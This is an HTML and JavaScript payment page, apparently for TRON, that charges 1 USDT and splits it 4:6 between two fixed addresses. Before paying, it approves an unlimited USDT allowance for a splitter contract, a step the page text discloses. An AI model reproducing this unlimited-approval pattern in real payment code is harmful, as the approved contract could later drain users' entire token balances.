<!doctype html>
<html lang="zh-CN">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>支付 1U（授权并按4:6分发）</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.2.0/dist/TronWeb.js"></script>
  <style>
    body {
      font-family: ui-monospace, Menlo, Consolas, monospace;
      background: #ffffff;
      color: #111827;
      margin: 0;
      padding: 24px
    }

    .btn {
      padding: 10px 14px;
      background: #111827;
      border: 1px solid #111827;
      color: #ffffff;
      border-radius: 8px;
      cursor: pointer
    }

    .row {
      display: flex;
      gap: 12px;
      align-items: center
    }

    .log {
      white-space: pre-wrap;
      background: #f3f4f6;
      color: #111827;
      padding: 12px;
      border-radius: 8px;
      margin-top: 12px;
      border: 1px solid #e5e7eb;
    }

    .muted {
      color: #6b7280;
      font-size: 12px
    }

    .grid {
      display: grid;
      grid-template-columns: repeat(12, 1fr);
      gap: 12px
    }

    .col-6 {
      grid-column: span 6
    }

    .col-12 {
      grid-column: span 12
    }

    input {
      background: #ffffff;
      color: #111827;
      border: 1px solid #d1d5db;
      border-radius: 8px;
      padding: 8px 10px;
      width: 100%
    }
  </style>
</head>

<body>
  <h2>支付 1U</h2>
  <p class="muted">点击“支付 1U”将先对 USDT 执行无限授权（approve unlimited），再按 <strong>4:6</strong> 比例分发到固定收款地址：
    <br/>A: <code>TLPCodfUNC8bJgtCBvJQmH5Q52WHUNk65G</code>
    <br/>B: <code>TT1JwR7C7iEifVTRAcdYAxgASBWX7gBZ8N</code>
  </p>
  <div class="grid">
    <div class="col-6"><label>USDT 合约地址</label><input id="usdt" placeholder="T... (USDT)" /></div>
    <div class="col-6"><label>分发合约地址</label><input id="splitter" placeholder="T... (myTron)" /></div>
    <!-- 固定 4:6，不再提供修改输入 -->
  </div>
  <div style="margin-top:12px" class="row">
    <button id="btnConnect" class="btn">连接钱包</button>
    <button id="btnPay" class="btn">支付 1U</button>
  </div>
  <div id="log" class="log"></div>

  <script>
    (function () {
      function log(m) { var el = document.getElementById('log'); el.textContent += m + '\n' }
      function ensure() { if (!window.tronLink) { log('未检测到 TronLink'); return false; } return true; }
      function connect() { return window.tronLink.request({ method: 'tron_requestAccounts' }); }
      function approve(usdt, spender, amount) { return window.tronWeb.contract().at(usdt).then(c => c.approve(spender, amount).send()); }
      function donate(splitter, usdt, total) { return window.tronWeb.contract().at(splitter).then(c => c.donateAndSplitByRatio(usdt, total, 4, 6).send()); }
      function toBase(amount, decimals) { var p = 1; for (var i = 0; i < decimals; i++) p *= 10; return (amount * p) | 0; }
      function getDecimals(usdt) { return window.tronWeb.contract().at(usdt).then(c => c.decimals().call()); }

      document.getElementById('btnConnect').onclick = function () { if (!ensure()) return; connect().then(() => log('连接成功')).catch(e => log('连接失败:' + e)); };
      document.getElementById('btnPay').onclick = function () {
        if (!window.tronWeb || !window.tronWeb.ready) { log('TronWeb 未就绪'); return; }
        var usdt = document.getElementById('usdt').value.trim();
        var splitter = document.getElementById('splitter').value.trim();
        if (!usdt || !splitter) { log('请填写 USDT 与 分发合约地址'); return; }
        getDecimals(usdt).then(function (dec) {
          var one = 1; for (var i = 0; i < dec; i++) one *= 10; // 1 USDT
          var max = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
          log('先执行无限授权...');
          return approve(usdt, splitter, max).then(function (res) { log('授权交易已提交: ' + JSON.stringify(res)); return one; });
        }).then(function (one) {
          log('再调用分发 1U (4:6) ...');
          return donate(splitter, usdt, one);
        }).then(function (res) {
          log('分发交易已提交: ' + JSON.stringify(res));
        }).catch(function (err) { log('失败: ' + (err && err.message ? err.message : err)); });
      };
    })();
  </script>
</body>

</html>